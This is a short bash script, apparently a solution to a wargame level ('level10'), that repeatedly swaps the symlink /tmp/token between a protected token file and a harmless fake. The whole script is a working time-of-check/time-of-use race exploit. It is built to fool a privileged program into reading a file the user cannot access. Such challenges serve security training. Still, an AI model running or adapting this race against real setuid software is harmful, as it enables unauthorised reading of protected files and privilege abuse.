#!/bin/bash

echo "fake" > /tmp/token
while true
do
        rm /tmp/token && ln -s /home/user/level10/token /tmp/token
        rm /tmp/token && ln -s /tmp/fake /tmp/token
done

